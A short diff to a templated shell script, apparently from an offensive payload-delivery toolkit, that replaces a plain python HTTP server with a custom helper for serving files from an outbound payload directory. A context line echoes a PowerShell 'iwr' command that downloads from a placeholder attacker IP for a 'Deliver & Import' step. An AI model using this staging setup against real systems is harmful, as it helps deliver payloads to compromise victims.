@@ -6,4 +6,4 @@ echo 'Deliver & Import: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(e
 echo '================================================================'; \
 echo '                         -----CMD-----                          '; \
 echo '================================================================'; \
-python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
